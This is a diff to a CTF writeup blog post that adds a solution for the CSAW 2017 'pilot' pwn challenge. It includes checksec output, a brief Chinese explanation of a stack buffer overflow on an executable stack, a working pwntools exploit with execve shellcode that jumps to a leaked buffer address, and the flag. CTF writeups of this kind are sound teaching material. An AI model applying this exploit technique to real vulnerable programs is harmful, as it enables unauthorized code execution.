@@ -1,7 +1,7 @@
 ---
 title: 'Writeups: Nightmare Series'
 date: '2024-07-24'
-lastmod: '2024-07-29'
+lastmod: '2024-07-30'
 tags: ['CTF','Writeup', 'Pwn', 'Nightmare']
 draft: false
 summary: 'Writeups for Nightmare Series'
@@ -748,4 +748,86 @@ interactive()
 ### Flag
 
 flag: `TUCTF{574ck_5m45h1n6_l1k3_4_pr0}`
+
+## CSAW 2017 pilot
+
+### Information
+
+ - Category: Pwn
+ - Points: 100
+
+### Description
+
+> Can I take your order?
+
+<Download name="pilot" href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/06-bof_shellcode/csaw17_pilot/pilot" type="Binary" />
+
+### Writeup
+
+```plain-text
+λ ~/ file pilot
+pilot: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6ed26a43b94fd3ff1dd15964e4106df72c01dc6c, stripped
+λ ~/ pwn checksec pilot
+[*] '/home/cub3y0nd/pilot'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX unknown - GNU_STACK missing
+    PIE:      No PIE (0x400000)
+    Stack:    Executable
+    RWX:      Has RWX segments
+```
+
+```plain-text
+[*]Welcome DropShip Pilot...
+[*]I am your assitant A.I....
+[*]I will be guiding you through the tutorial....
+[*]As a first step, lets learn how to land at the designated location....
+[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines & Medics...
+[*]Good Luck Pilot!....
+[*]Location:0x7ffdaefb40d0
+[*]Command:self-destruct
+```
+
+伪代码如下：
+
+<center>
+  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/30/pkLhlbd.png" width={1920} height={1080} />
+</center>
+
+可以看到除了 `main` 函数之外就没有别的函数了，那就不是 `ret2win` 题型。
+
+接收的输入大于 `buf` 的大小，存在栈溢出漏洞。由于栈可执行，我们可以尝试运行 shellcode 来 get shell。
+
+在栈中安排 shellcode 的布局如下：因为程序给出了 `buf` 的地址，所以我们可以将 shellcode 插在 `buf` 的头部，然后填满 `buf` 的剩余空间，最后将 `buf` 的起始地址溢出到 `ret` 就实现了执行 shellcode 的逻辑。
+
+### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import *
+
+context(os='linux', arch='amd64', log_level='debug', terminal='kitty')
+
+target = process('./pilot')
+
+recvline    = lambda : target.recvline()
+recvuntil   = lambda str : target.recvuntil(str)
+sendline    = lambda str : target.sendline(str)
+interactive = lambda : target.interactive()
+
+recvuntil(b':')
+leak_addr = p64(int(recvline(), 16))
+
+shellcode = b'\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05'
+payload = shellcode + b'A' * (0x28 - len(shellcode)) + leak_addr
+
+sendline(payload)
+interactive()
+```
+
+### Flag
+
+Flag: `flag{1nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys}`
 
